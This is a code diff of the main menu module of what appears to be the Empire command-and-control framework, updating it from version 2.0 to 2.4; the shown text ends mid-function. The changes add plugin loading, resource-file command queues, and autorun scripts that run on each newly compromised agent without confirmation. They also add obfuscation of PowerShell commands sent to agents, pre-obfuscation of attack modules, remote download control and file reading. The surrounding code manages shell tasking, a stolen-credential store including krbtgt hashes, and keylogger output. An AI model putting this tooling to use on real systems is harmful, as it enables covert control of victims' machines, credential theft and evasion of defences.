@@ -9,7 +9,7 @@ menu loops.
 """
 
 # make version for Empire
-VERSION = "2.0"
+VERSION = "2.4"
 
 from pydispatch import dispatcher
 
@@ -19,7 +19,11 @@ import sqlite3
 import os
 import hashlib
 import time
-
+import fnmatch
+import shlex
+import pkgutil
+import importlib
+import base64
 
 # Empire imports
 import helpers
@@ -29,6 +33,7 @@ import listeners
 import modules
 import stagers
 import credentials
+import plugins
 from zlib_wrapper import compress
 from zlib_wrapper import decompress
 
@@ -60,19 +65,23 @@ class MainMenu(cmd.Cmd):
     The main class used by Empire to drive the 'main' menu
     displayed when Empire starts.
     """
-    def __init__(self, args=None, restAPI=False):
+    def __init__(self, args=None):
 
         cmd.Cmd.__init__(self)
 
         # globalOptions[optionName] = (value, required, description)
         self.globalOptions = {}
 
+        # currently active plugins:
+        # {'pluginName': classObject}
+        self.loadedPlugins = {}
+
         # empty database object
         self.conn = self.database_connect()
         time.sleep(1)
 
         # pull out some common configuration information
-        (self.isroot, self.installPath, self.ipWhiteList, self.ipBlackList) = helpers.get_config('rootuser, install_path,ip_whitelist,ip_blacklist')
+        (self.isroot, self.installPath, self.ipWhiteList, self.ipBlackList, self.obfuscate, self.obfuscateCommand) = helpers.get_config('rootuser, install_path,ip_whitelist,ip_blacklist,obfuscate,obfuscate_command')
 
         # change the default prompt for the user
         self.prompt = '(Empire) > '
@@ -81,21 +90,24 @@ class MainMenu(cmd.Cmd):
 
         dispatcher.connect(self.handle_event, sender=dispatcher.Any)
 
-        # Main, Agents, or Listeners
+        # Main, Agents, or 
         self.menu_state = 'Main'
 
         # parse/handle any passed command line arguments
         self.args = args
-        self.handle_args()
-
-        dispatcher.send('[*] Empire starting up...', sender="Empire")
-
         # instantiate the agents, listeners, and stagers objects
         self.agents = agents.Agents(self, args=args)
         self.credentials = credentials.Credentials(self, args=args)
         self.stagers = stagers.Stagers(self, args=args)
         self.modules = modules.Modules(self, args=args)
         self.listeners = listeners.Listeners(self, args=args)
+        self.resourceQueue = []
+        #A hashtable of autruns based on agent language
+        self.autoRuns = {}
+
+        self.handle_args()
+
+        dispatcher.send('[*] Empire starting up...', sender="Empire")
 
         # print the loading menu
         messages.loading()
@@ -135,6 +147,9 @@ class MainMenu(cmd.Cmd):
         """
         Handle any passed arguments.
         """
+	if self.args.resource:
+	    resourceFile = self.args.resource[0]
+	    self.do_resource(resourceFile)
 
         if self.args.listener or self.args.stager:
             # if we're displaying listeners/stagers or generating a stager
@@ -228,11 +243,6 @@ class MainMenu(cmd.Cmd):
             print helpers.color("[!] Please run database_setup.py")
             sys.exit()
 
-
-    # def preloop(self):
-    #     traceback.print_stack()
-
-
     def cmdloop(self):
         """
         The main cmdloop logic that handles navigation to other menus.
@@ -269,6 +279,9 @@ class MainMenu(cmd.Cmd):
                     print "       " + helpers.color(str(num_modules), "green") + " modules currently loaded\n"
                     print "       " + helpers.color(str(num_listeners), "green") + " listeners currently active\n"
                     print "       " + helpers.color(str(num_agents), "green") + " agents currently active\n\n"
+
+		    if len(self.resourceQueue) > 0:
+	    		self.cmdqueue.append(self.resourceQueue.pop(0))
 
                     cmd.Cmd.cmdloop(self)
 
@@ -376,10 +389,88 @@ class MainMenu(cmd.Cmd):
     # CMD methods
     ###################################################
 
+    def do_plugins(self, args):
+        "List all available and active plugins."
+        pluginPath = os.path.abspath("plugins")
+        print(helpers.color("[*] Searching for plugins at {}".format(pluginPath)))
+        # From walk_packages: "Note that this function must import all packages
+        # (not all modules!) on the given path, in order to access the __path__
+        # attribute to find submodules."
+        pluginNames = [name for _, name, _ in pkgutil.walk_packages([pluginPath])]
+        numFound = len(pluginNames)
+
+        # say how many we found, handling the 1 case
+        if numFound == 1:
+            print(helpers.color("[*] {} plugin found".format(numFound)))
+        else:
+            print(helpers.color("[*] {} plugins found".format(numFound)))
+
+        # if we found any, list them
+        if numFound > 0:
+            print("\tName\tActive")
+            print("\t----\t------")
+            activePlugins = self.loadedPlugins.keys()
+            for name in pluginNames:
+                active = ""
+                if name in activePlugins:
+                    active = "******"
+                print("\t" + name + "\t" + active)
+
+        print("")
+        print(helpers.color("[*] Use \"plugin <plugin name>\" to load a plugin."))
+
+    def do_plugin(self, pluginName):
+        "Load a plugin file to extend Empire."
+        pluginPath = os.path.abspath("plugins")
+        print(helpers.color("[*] Searching for plugins at {}".format(pluginPath)))
+        # From walk_packages: "Note that this function must import all packages
+        # (not all modules!) on the given path, in order to access the __path__
+        # attribute to find submodules."
+        pluginNames = [name for _, name, _ in pkgutil.walk_packages([pluginPath])]
+        if pluginName in pluginNames:
+            print(helpers.color("[*] Plugin {} found.".format(pluginName)))
+            # 'self' is the mainMenu object
+            plugins.load_plugin(self, pluginName)
+        else:
+            raise Exception("[!] Error: the plugin specified does not exist in {}.".format(pluginPath))
+
+    def postcmd(self, stop, line):
+	if len(self.resourceQueue) > 0:
+	    nextcmd = self.resourceQueue.pop(0)
+	    self.cmdqueue.append(nextcmd)
+
     def default(self, line):
         "Default handler."
         pass
 
+    def do_resource(self, arg):
+	"Read and execute a list of Empire commands from a file."
+	self.resourceQueue.extend(self.buildQueue(arg))
+
+    def buildQueue(self, resourceFile, autoRun=False):
+	cmds = []
+	if os.path.isfile(resourceFile):
+	    with open(resourceFile, 'r') as f:
+		lines = []
+		lines.extend(f.read().splitlines())
+	else:
+	    raise Exception("[!] Error: The resource file specified \"%s\" does not exist" % resourceFile)
+	for lineFull in lines:
+	    line = lineFull.strip()
+	    #ignore lines that start with the comment symbol (#)
+	    if line.startswith("#"):
+		continue
+	    #read in another resource file
+	    elif line.startswith("resource "):
+		rf = line.split(' ')[1]
+		cmds.extend(self.buildQueue(rf, autoRun))
+	    #add noprompt option to execute without user confirmation
+	    elif autoRun and line == "execute":
+		cmds.append(line + " noprompt")
+	    else:
+		cmds.append(line)
+
+	return cmds
 
     def do_exit(self, line):
         "Exit Empire"
@@ -426,13 +517,14 @@ class MainMenu(cmd.Cmd):
                     stager_menu.cmdloop()
             else:
                 print helpers.color("[!] Error in MainMenu's do_userstager()")
-
         except Exception as e:
             raise e
 
 
     def do_usemodule(self, line):
         "Use an Empire module."
+        # Strip asterisks added by MainMenu.complete_usemodule()
+        line = line.rstrip("*")
         if line not in self.modules.modules:
             print helpers.color("[!] Error: invalid module")
         else:
@@ -456,10 +548,10 @@ class MainMenu(cmd.Cmd):
         if filterTerm == "":
             creds = self.credentials.get_credentials()
 
-        elif filterTerm.split()[0].lower() == "add":
+        elif shlex.split(filterTerm)[0].lower() == "add":
 
             # add format: "domain username password <notes> <credType> <sid>
-            args = filterTerm.split()[1:]
+            args = shlex.split(filterTerm)[1:]
 
             if len(args) == 3:
                 domain, username, password = args
@@ -490,10 +582,10 @@ class MainMenu(cmd.Cmd):
 
             creds = self.credentials.get_credentials()
 
-        elif filterTerm.split()[0].lower() == "remove":
+        elif shlex.split(filterTerm)[0].lower() == "remove":
 
             try:
-                args = filterTerm.split()[1:]
+                args = shlex.split(filterTerm)[1:]
                 if len(args) != 1:
                     print helpers.color("[!] Format is 'remove <credID>/<credID-credID>/all'")
                 else:
@@ -519,8 +611,8 @@ class MainMenu(cmd.Cmd):
             return
 
 
-        elif filterTerm.split()[0].lower() == "export":
-            args = filterTerm.split()[1:]
+        elif shlex.split(filterTerm)[0].lower() == "export":
+            args = shlex.split(filterTerm)[1:]
 
             if len(args) != 1:
                 print helpers.color("[!] Please supply an output filename/filepath.")
@@ -529,13 +621,13 @@ class MainMenu(cmd.Cmd):
                 self.credentials.export_credentials(args[0])
                 return
 
-        elif filterTerm.split()[0].lower() == "plaintext":
+        elif shlex.split(filterTerm)[0].lower() == "plaintext":
             creds = self.credentials.get_credentials(credtype="plaintext")
 
-        elif filterTerm.split()[0].lower() == "hash":
+        elif shlex.split(filterTerm)[0].lower() == "hash":
             creds = self.credentials.get_credentials(credtype="hash")
 
-        elif filterTerm.split()[0].lower() == "krbtgt":
+        elif shlex.split(filterTerm)[0].lower() == "krbtgt":
             creds = self.credentials.get_krbtgt()
 
         else:
@@ -573,8 +665,22 @@ class MainMenu(cmd.Cmd):
                         print helpers.color("[!] Error opening ip file %s" % (parts[1]))
                 else:
                     self.agents.ipBlackList = helpers.generate_ip_list(",".join(parts[1:]))
+            elif parts[0].lower() == "obfuscate":
+                if parts[1].lower() == "true":
+                    if not helpers.is_powershell_installed():
+                        print helpers.color("[!] PowerShell is not installed and is required to use obfuscation, please install it first.")
+                    else:
+                        self.obfuscate = True
+                        print helpers.color("[*] Obfuscating all future powershell commands run on all agents.")
+                elif parts[1].lower() == "false":
+                    print helpers.color("[*] Future powershell command run on all agents will not be obfuscated.")
+                    self.obfuscate = False
+                else:
+                    print helpers.color("[!] Valid options for obfuscate are 'true' or 'false'")
+            elif parts[0].lower() == "obfuscate_command":
+                self.obfuscateCommand = parts[1]
             else:
-                print helpers.color("[!] Please choose 'ip_whitelist' or 'ip_blacklist'")
+                print helpers.color("[!] Please choose 'ip_whitelist', 'ip_blacklist', 'obfuscate', or 'obfuscate_command'")
 
 
     def do_reset(self, line):
@@ -593,6 +699,10 @@ class MainMenu(cmd.Cmd):
             print self.agents.ipWhiteList
         if line.strip().lower() == "ip_blacklist":
             print self.agents.ipBlackList
+        if line.strip().lower() == "obfuscate":
+            print self.obfuscate
+        if line.strip().lower() == "obfuscate_command":
+            print self.obfuscateCommand
 
 
     def do_load(self, line):
@@ -682,23 +792,86 @@ class MainMenu(cmd.Cmd):
         name = line.strip()
 
         sessionID = self.agents.get_agent_id_db(name)
-
         if sessionID and sessionID != '' and sessionID in self.agents.agents:
             AgentMenu(self, sessionID)
         else:
             print helpers.color("[!] Please enter a valid agent name")
+
+    def do_preobfuscate(self, line):
+        "Preobfuscate PowerShell module_source files"
+        
+        if not helpers.is_powershell_installed():
+            print helpers.color("[!] PowerShell is not installed and is required to use obfuscation, please install it first.")
+            return
+        
+        module = line.strip()
+        obfuscate_all = False
+        obfuscate_confirmation = False
+        reobfuscate = False
+        
+        # Preobfuscate ALL module_source files
+        if module == "" or module == "all":
+            choice = raw_input(helpers.color("[>] Preobfuscate all PowerShell module_source files using obfuscation command: \"" + self.obfuscateCommand + "\"?\nThis may take a substantial amount of time. [y/N] ", "red"))
+            if choice.lower() != "" and choice.lower()[0] == "y":
+                obfuscate_all = True
+                obfuscate_confirmation = True
+                choice = raw_input(helpers.color("[>] Force reobfuscation of previously obfuscated modules? [y/N] ", "red"))
+                if choice.lower() != "" and choice.lower()[0] == "y":
+                    reobfuscate = True
+
+        # Preobfuscate a selected module_source file
+        else:
+            module_source_fullpath = self.installPath + 'data/module_source/' + module
+            if not os.path.isfile(module_source_fullpath):
+                print helpers.color("[!] The module_source file:" + module_source_fullpath + " does not exist.")
+                return
+
+            choice = raw_input(helpers.color("[>] Preobfuscate the module_source file: " + module + " using obfuscation command: \"" + self.obfuscateCommand + "\"? [y/N] ", "red"))
+            if choice.lower() != "" and choice.lower()[0] == "y":
+                obfuscate_confirmation = True
+                choice = raw_input(helpers.color("[>] Force reobfuscation of previously obfuscated modules? [y/N] ", "red"))
+                if choice.lower() != "" and choice.lower()[0] == "y":
+                    reobfuscate = True
+
+        # Perform obfuscation
+        if obfuscate_confirmation:
+            if obfuscate_all:
+                files = [file for file in helpers.get_module_source_files()]
+            else:
+                files = ['data/module_source/' + module]
+            for file in files:
+                file = self.installPath + file
+                if reobfuscate or not helpers.is_obfuscated(file):
+                    print helpers.color("[*] Obfuscating " + os.path.basename(file) + "...")
+                else:
+                    print helpers.color("[*] " + os.path.basename(file) + " was already obfuscated. Not reobfuscating.")
+                helpers.obfuscate_module(file, self.obfuscateCommand, reobfuscate)
 
 
     def complete_usemodule(self, text, line, begidx, endidx, language=None):
         "Tab-complete an Empire module path."
 
         module_names = self.modules.modules.keys()
+
+        # suffix each module requiring elevated context with '*'
+        for module_name in module_names:
+            try:
+                if self.modules.modules[module_name].info['NeedsAdmin']:
+                    module_names[module_names.index(module_name)] = (module_name+"*")
+            # handle modules without a NeedAdmins info key
+            except KeyError:
+                pass
+
         if language:
             module_names = [ (module_name[len(language)+1:]) for module_name in module_names if module_name.startswith(language)]
 
         mline = line.partition(' ')[2]
+
         offs = len(mline) - len(text)
-        return [s[offs:] for s in module_names if s.startswith(mline)]
+
+        module_names = [s[offs:] for s in module_names if s.startswith(mline)]
+
+        return module_names
 
 
     def complete_reload(self, text, line, begidx, endidx):
@@ -743,7 +916,7 @@ class MainMenu(cmd.Cmd):
     def complete_set(self, text, line, begidx, endidx):
         "Tab-complete a global option."
 
-        options = ["ip_whitelist", "ip_blacklist"]
+        options = ["ip_whitelist", "ip_blacklist", "obfuscate", "obfuscate_command"]
 
         if line.split(' ')[1].lower() in options:
             return helpers.complete_path(text, line, arg=True)
@@ -793,25 +966,67 @@ class MainMenu(cmd.Cmd):
 
         return self.complete_setlist(text, line, begidx, endidx)
 
+    def complete_preobfuscate(self, text, line, begidx, endidx):
+        "Tab-complete an interact command"
+        options = [ (option[len('data/module_source/'):]) for option in helpers.get_module_source_files() ]
+        options.append('all')
 
-class AgentsMenu(cmd.Cmd):
-    """
-    The main class used by Empire to drive the 'agents' menu.
-    """
+        mline = line.partition(' ')[2]
+        offs = len(mline) - len(text)
+        return [s[offs:] for s in options if s.startswith(mline)]
+
+class SubMenu(cmd.Cmd):
+
     def __init__(self, mainMenu):
         cmd.Cmd.__init__(self)
-
         self.mainMenu = mainMenu
 
-        self.doc_header = 'Commands'
+    def cmdloop(self):
+	if len(self.mainMenu.resourceQueue) > 0:
+	    self.cmdqueue.append(self.mainMenu.resourceQueue.pop(0))
+	cmd.Cmd.cmdloop(self)
 
-        # set the prompt text
-        self.prompt = '(Empire: ' + helpers.color("agents", color="blue") + ') > '
+    def emptyline(self):
+        pass
 
-        messages.display_agents(self.mainMenu.agents.get_agents_db())
 
-    # def preloop(self):
-    #     traceback.print_stack()
+    def postcmd(self, stop, line):
+	if line == "back":
+	    return True
+	if len(self.mainMenu.resourceQueue) > 0:
+	    nextcmd = self.mainMenu.resourceQueue.pop(0)
+	    if nextcmd == "lastautoruncmd":
+	        raise Exception("endautorun")
+	    self.cmdqueue.append(nextcmd)
+
+
+    def do_back(self, line):
+	"Go back a menu."
+	return True
+
+    def do_listeners(self, line):
+        "Jump to the listeners menu."
+        raise NavListeners()
+
+    def do_agents(self, line):
+        "Jump to the agents menu."
+        raise NavAgents()
+
+    def do_main(self, line):
+        "Go back to the main menu."
+        raise NavMain()
+
+    def do_resource(self, arg):
+	"Read and execute a list of Empire commands from a file."
+	self.mainMenu.resourceQueue.extend(self.mainMenu.buildQueue(arg))
+
+    def do_exit(self, line):
+        "Exit Empire."
+        raise KeyboardInterrupt
+
+    def do_creds(self, line):
+        "Display/return credentials from the database."
+        self.mainMenu.do_creds(line)
 
     # print a nicely formatted help menu
     #   stolen/adapted from recon-ng
@@ -824,29 +1039,63 @@ class AgentsMenu(cmd.Cmd):
                 self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
             self.stdout.write("\n")
 
+    # def preloop(self):
+    #     traceback.print_stack()
 
-    def emptyline(self):
-        pass
+class AgentsMenu(SubMenu):
+    """
+    The main class used by Empire to drive the 'agents' menu.
+    """
+    def __init__(self, mainMenu):
+        SubMenu.__init__(self, mainMenu)
 
+        self.doc_header = 'Commands'
+
+        # set the prompt text
+        self.prompt = '(Empire: ' + helpers.color("agents", color="blue") + ') > '
+
+        messages.display_agents(self.mainMenu.agents.get_agents_db())
 
     def do_back(self, line):
         "Go back to the main menu."
         raise NavMain()
 
-
-    def do_listeners(self, line):
-        "Jump to the listeners menu."
-        raise NavListeners()
-
-
-    def do_main(self, line):
-        "Go back to the main menu."
-        raise NavMain()
-
-
-    def do_exit(self, line):
-        "Exit Empire."
-        raise KeyboardInterrupt
+    def do_autorun(self, line):
+	"Read and execute a list of Empire commands from a file and execute on each new agent \"autorun <resource file> <agent language>\" e.g. \"autorun /root/ps.rc powershell\". Or clear any autorun setting with \"autorun clear\" and show current autorun settings with \"autorun show\""
+	line = line.strip()
+        if not line:
+	    print helpers.color("[!] You must specify a resource file, show or clear. e.g. 'autorun /root/res.rc powershell' or 'autorun clear'")
+	    return
+	cmds = line.split(' ')
+	resourceFile = cmds[0]
+	language = None
+        if len(cmds) > 1:
+	    language = cmds[1].lower()
+	elif not resourceFile == "show" and not resourceFile == "clear":
+	    print helpers.color("[!] You must specify the agent language to run this module on. e.g. 'autorun /root/res.rc powershell' or 'autorun /root/res.rc python'")
+	    return
+	#show the current autorun settings by language or all
+	if resourceFile == "show":
+	    if language:
+		if self.mainMenu.autoRuns.has_key(language):
+		    print self.mainMenu.autoRuns[language]
+		else:
+		    print "No autorun commands for language %s" % language
+	    else:
+	        print self.mainMenu.autoRuns
+	#clear autorun settings by language or all
+	elif resourceFile == "clear":
+	    if language and not language == "all":
+		if self.mainMenu.autoRuns.has_key(language):
+		    self.mainMenu.autoRuns.pop(language)
+		else:
+		    print "No autorun commands for language %s" % language
+	    else:
+		#clear all autoruns
+		self.mainMenu.autoRuns.clear()
+	#read in empire commands from the specified resource file
+	else:
+	    self.mainMenu.autoRuns[language] = self.mainMenu.buildQueue(resourceFile, True)
 
 
     def do_list(self, line):
@@ -858,7 +1107,6 @@ class AgentsMenu(cmd.Cmd):
             self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
         else:
             self.mainMenu.do_list("agents " + str(line))
-
 
     def do_rename(self, line):
         "Rename a particular agent."
@@ -915,12 +1163,6 @@ class AgentsMenu(cmd.Cmd):
                     print helpers.color("[!] Invalid agent name")
             except KeyboardInterrupt:
                 print ''
-
-
-    def do_creds(self, line):
-        "Display/return credentials from the database."
-        self.mainMenu.do_creds(line)
-
 
     def do_clear(self, line):
         "Clear one or more agent's taskings."
@@ -1206,7 +1448,8 @@ class AgentsMenu(cmd.Cmd):
     def do_usemodule(self, line):
         "Use an Empire PowerShell module."
 
-        module = line.strip()
+        # Strip asterisks added by MainMenu.complete_usemodule()
+        module = line.strip().rstrip("*")
 
         if module not in self.mainMenu.modules.modules:
             print helpers.color("[!] Error: invalid module")
@@ -1314,7 +1557,7 @@ class AgentsMenu(cmd.Cmd):
         return self.mainMenu.complete_creds(text, line, begidx, endidx)
 
 
-class AgentMenu(cmd.Cmd):
+class AgentMenu(SubMenu):
     """
     An abstracted class used by Empire to determine which agent menu type
     to instantiate.
@@ -1323,25 +1566,24 @@ class AgentMenu(cmd.Cmd):
 
         agentLanguage = mainMenu.agents.get_language_db(sessionID)
 
-        if agentLanguage.lower() == 'powershell':
-            agent_menu = PowerShellAgentMenu(mainMenu, sessionID)
-            agent_menu.cmdloop()
-        elif agentLanguage.lower() == 'python':
-            agent_menu = PythonAgentMenu(mainMenu, sessionID)
-            agent_menu.cmdloop()
-        else:
-            print helpers.color("[!] Agent language %s not recognized." % (agentLanguage))
+	if agentLanguage.lower() == 'powershell':
+	    agent_menu = PowerShellAgentMenu(mainMenu, sessionID)
+	    agent_menu.cmdloop()
+	elif agentLanguage.lower() == 'python':
+	    agent_menu = PythonAgentMenu(mainMenu, sessionID)
+	    agent_menu.cmdloop()
+	else:
+	    print helpers.color("[!] Agent language %s not recognized." % (agentLanguage))
 
 
-class PowerShellAgentMenu(cmd.Cmd):
+class PowerShellAgentMenu(SubMenu):
     """
     The main class used by Empire to drive an individual 'agent' menu.
     """
     def __init__(self, mainMenu, sessionID):
 
-        cmd.Cmd.__init__(self)
+        SubMenu.__init__(self, mainMenu)
 
-        self.mainMenu = mainMenu
         self.sessionID = sessionID
         self.doc_header = 'Agent Commands'
 
@@ -1363,7 +1605,6 @@ class PowerShellAgentMenu(cmd.Cmd):
         # listen for messages from this specific agent
         dispatcher.connect(self.handle_agent_event, sender=dispatcher.Any)
 
-
     # def preloop(self):
     #     traceback.print_stack()
 
@@ -1376,34 +1617,16 @@ class PowerShellAgentMenu(cmd.Cmd):
             pass
 
         name = self.mainMenu.agents.get_agent_name_db(self.sessionID)
-
         if (str(self.sessionID) + " returned results" in signal) or (str(name) + " returned results" in signal):
             # display any results returned by this agent that are returned
-            # while we are interacting with it
+            # while we are interacting with it, unless they are from the powershell keylogger
             results = self.mainMenu.agents.get_agent_results_db(self.sessionID)
-            if results:
+            if results and not sender == "AgentsPsKeyLogger":
                 print "\n" + results
 
         elif "[+] Part of file" in signal and "saved" in signal:
             if (str(self.sessionID) in signal) or (str(name) in signal):
                 print helpers.color(signal)
-
-
-    # print a nicely formatted help menu
-    #   stolen/adapted from recon-ng
-    def print_topics(self, header, commands, cmdlen, maxcol):
-        if commands:
-            self.stdout.write("%s\n" % str(header))
-            if self.ruler:
-                self.stdout.write("%s\n" % str(self.ruler * len(header)))
-            for command in commands:
-                self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
-            self.stdout.write("\n")
-
-
-    def emptyline(self):
-        pass
-
 
     def default(self, line):
         "Default handler"
@@ -1424,27 +1647,6 @@ class PowerShellAgentMenu(cmd.Cmd):
                 print helpers.color("[!] Command not recognized.")
                 print helpers.color("[*] Use 'help' or 'help agentcmds' to see available commands.")
 
-
-    def do_back(self, line):
-        "Go back a menu."
-        return True
-
-
-    def do_agents(self, line):
-        "Jump to the Agents menu."
-        raise NavAgents()
-
-
-    def do_listeners(self, line):
-        "Jump to the listeners menu."
-        raise NavListeners()
-
-
-    def do_main(self, line):
-        "Go back to the main menu."
-        raise NavMain()
-
-
     def do_help(self, *args):
         "Displays the help menu or syntax for particular commands."
 
@@ -1452,8 +1654,7 @@ class PowerShellAgentMenu(cmd.Cmd):
             print "\n" + helpers.color("[*] Available opsec-safe agent commands:\n")
             print "     " + messages.wrap_columns(", ".join(self.agentCommands), ' ', width1=50, width2=10, indent=5) + "\n"
         else:
-            cmd.Cmd.do_help(self, *args)
-
+            SubMenu.do_help(self, *args)
 
     def do_list(self, line):
         "Lists all active agents (or listeners)."
@@ -1464,7 +1665,6 @@ class PowerShellAgentMenu(cmd.Cmd):
             self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
         else:
             print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")
-
 
     def do_rename(self, line):
         "Rename the agent."
@@ -1481,7 +1681,6 @@ class PowerShellAgentMenu(cmd.Cmd):
         else:
             print helpers.color("[!] Please enter a new name for the agent")
 
-
     def do_info(self, line):
         "Display information about this agent"
 
@@ -1489,13 +1688,12 @@ class PowerShellAgentMenu(cmd.Cmd):
         agent = self.mainMenu.agents.get_agent_db(self.sessionID)
         messages.display_agent(agent)
 
-
     def do_exit(self, line):
         "Task agent to exit."
 
         try:
             choice = raw_input(helpers.color("[>] Task agent to exit? [y/N] ", "red"))
-            if choice.lower() != "" and choice.lower()[0] == "y":
+            if choice.lower() == "y":
 
                 self.mainMenu.agents.add_agent_task_db(self.sessionID, 'TASK_EXIT')
                 # update the agent log
@@ -1529,6 +1727,23 @@ class PowerShellAgentMenu(cmd.Cmd):
             # update the agent log
             self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to stop job " + str(jobID))
 
+    def do_downloads(self, line):
+        "Return downloads or kill a download job"
+
+        parts = line.split(' ')
+
+        if len(parts) == 1:
+            if parts[0] == '':
+                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_GETDOWNLOADS")
+                #update the agent log
+                self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get downloads")
+            else:
+                print helpers.color("[!] Please use for m 'downloads kill DOWNLOAD_ID'")
+        elif len(parts) == 2:
+            jobID = parts[1].strip()
+            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_STOPDOWNLOAD", jobID)
+            #update the agent log
+            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to stop download " + str(jobID))
 
     def do_sleep(self, line):
         "Task an agent to 'sleep interval [jitter]'"
@@ -1585,7 +1800,6 @@ class PowerShellAgentMenu(cmd.Cmd):
 
             self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", command)
 
-            # update the agent log
             msg = "Tasked agent to kill process: " + str(process)
             self.mainMenu.agents.save_agent_log(self.sessionID, msg)
 
@@ -1661,7 +1875,7 @@ class PowerShellAgentMenu(cmd.Cmd):
         "Task an agent to download a file."
 
         line = line.strip()
-
+        
         if line != "":
             self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_DOWNLOAD", line)
             # update the agent log
@@ -1754,7 +1968,8 @@ class PowerShellAgentMenu(cmd.Cmd):
     def do_usemodule(self, line):
         "Use an Empire PowerShell module."
 
-        module = "powershell/%s" %(line.strip())
+        # Strip asterisks added by MainMenu.complete_usemodule()
+        module = "powershell/%s" %(line.strip().rstrip("*"))
 
         if module not in self.mainMenu.modules.modules:
             print helpers.color("[!] Error: invalid module")
@@ -2135,13 +2350,11 @@ class PowerShellAgentMenu(cmd.Cmd):
         return self.mainMenu.complete_creds(text, line, begidx, endidx)
 
 
-class PythonAgentMenu(cmd.Cmd):
+class PythonAgentMenu(SubMenu):
 
     def __init__(self, mainMenu, sessionID):
 
-        cmd.Cmd.__init__(self)
-
-        self.mainMenu = mainMenu
+        SubMenu.__init__(self, mainMenu)
 
         self.sessionID = sessionID
 
@@ -2162,9 +2375,6 @@ class PythonAgentMenu(cmd.Cmd):
         if results:
             print "\n" + results.rstrip('\r\n')
 
-    # def preloop(self):
-    #     traceback.print_stack()
-
     def handle_agent_event(self, signal, sender):
         """
         Handle agent event signals.
@@ -2184,51 +2394,13 @@ class PythonAgentMenu(cmd.Cmd):
             if (str(self.sessionID) in signal) or (str(name) in signal):
                 print helpers.color(signal)
 
-
-    # print a nicely formatted help menu
-    #   stolen/adapted from recon-ng
-    def print_topics(self, header, cmds, cmdlen, maxcol):
-        if cmds:
-            self.stdout.write("%s\n" % str(header))
-            if self.ruler:
-                self.stdout.write("%s\n" % str(self.ruler * len(header)))
-            for c in cmds:
-                self.stdout.write("%s %s\n" % (c.ljust(17), getattr(self, 'do_' + c).__doc__))
-            self.stdout.write("\n")
-
-
-    def emptyline(self):
-        pass
-
-
     def default(self, line):
         "Default handler"
         print helpers.color("[!] Command not recognized, use 'help' to see available commands")
 
-
-    def do_back(self, line):
-        "Go back a menu."
-        return True
-
-
-    def do_agents(self, line):
-        "Jump to the Agents menu."
-        raise NavAgents()
-
-
-    def do_listeners(self, line):
-        "Jump to the listeners menu."
-        raise NavListeners()
-
-
-    def do_main(self, line):
-        "Go back to the main menu."
-        raise NavMain()
-
-
     def do_help(self, *args):
         "Displays the help menu or syntax for particular commands."
-        cmd.Cmd.do_help(self, *args)
+        SubMenu.do_help(self, *args)
 
 
     def do_list(self, line):
@@ -2271,7 +2443,7 @@ class PythonAgentMenu(cmd.Cmd):
 
         try:
             choice = raw_input(helpers.color("[>] Task agent to exit? [y/N] ", "red"))
-            if choice.lower() != "" and choice.lower()[0] == "y":
+            if choice.lower() == "y":
 
                 self.mainMenu.agents.add_agent_task_db(self.sessionID, 'TASK_EXIT')
                 # update the agent log
@@ -2470,10 +2642,10 @@ class PythonAgentMenu(cmd.Cmd):
             open_file.close()
             script = script.replace('\r\n', '\n')
             script = script.replace('\r', '\n')
-
+            encScript = base64.b64encode(script)
             msg = "[*] Tasked agent to execute python script: "+filename
             print helpers.color(msg, color="green")
-            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", script)
+            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SCRIPT_COMMAND", encScript)
             #update the agent log
             self.mainMenu.agents.save_agent_log(self.sessionID, msg)
         else:
@@ -2551,7 +2723,9 @@ class PythonAgentMenu(cmd.Cmd):
     def do_usemodule(self, line):
         "Use an Empire Python module."
 
-        module = "python/%s" %(line.strip())
+        # Strip asterisks added by MainMenu.complete_usemodule()
+        module = "python/%s" %(line.strip().rstrip("*"))
+
 
         if module not in self.mainMenu.modules.modules:
             print helpers.color("[!] Error: invalid module")
@@ -2571,7 +2745,7 @@ class PythonAgentMenu(cmd.Cmd):
             self.mainMenu.modules.search_modules(searchTerm)
 
     def do_sc(self, line):
-        "Use pyobjc and Foundation libraries to take a screenshot, and save the image to the server"
+        "Use the python-mss module to take a screenshot, and save the image to the server. Not opsec safe"
 
         if self.mainMenu.modules.modules['python/collection/osx/native_screenshot']:
             module = self.mainMenu.modules.modules['python/collection/osx/native_screenshot']
@@ -2585,23 +2759,53 @@ class PythonAgentMenu(cmd.Cmd):
         else:
             print helpers.color("[!] python/collection/osx/screenshot module not loaded")
 
-    def do_ls(self, line):
+    def do_ls_m(self, line):
         "List directory contents at the specified path"
         #http://stackoverflow.com/questions/17809386/how-to-convert-a-stat-output-to-a-unix-permissions-string
-        if self.mainMenu.modules.modules['python/management/osx/ls']:
-            module = self.mainMenu.modules.modules['python/management/osx/ls']
+        if self.mainMenu.modules.modules['python/management/osx/ls_m']:
+            module = self.mainMenu.modules.modules['python/management/osx/ls_m']
             if line.strip() != '':
                 module.options['Path']['Value'] = line.strip()
 
             module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
-            module_menu = ModuleMenu(self.mainMenu, 'python/management/osx/ls')
+            module_menu = ModuleMenu(self.mainMenu, 'python/management/osx/ls_m')
             msg = "[*] Tasked agent to list directory contents of: "+str(module.options['Path']['Value'])
             print helpers.color(msg,color="green")
             self.mainMenu.agents.save_agent_log(self.sessionID, msg)
             module_menu.do_execute("")
 
         else:
-            print helpers.color("[!] python/management/osx/ls module not loaded")
+            print helpers.color("[!] python/management/osx/ls_m module not loaded")
+
+    def do_cat(self, line):
+        "View the contents of a file"
+
+        if line != "":
+
+            cmd = """
+try:
+    output = ""
+    with open("%s","r") as f:
+        for line in f:
+            output += line
+    
+    print output
+except Exception as e:
+    print str(e)
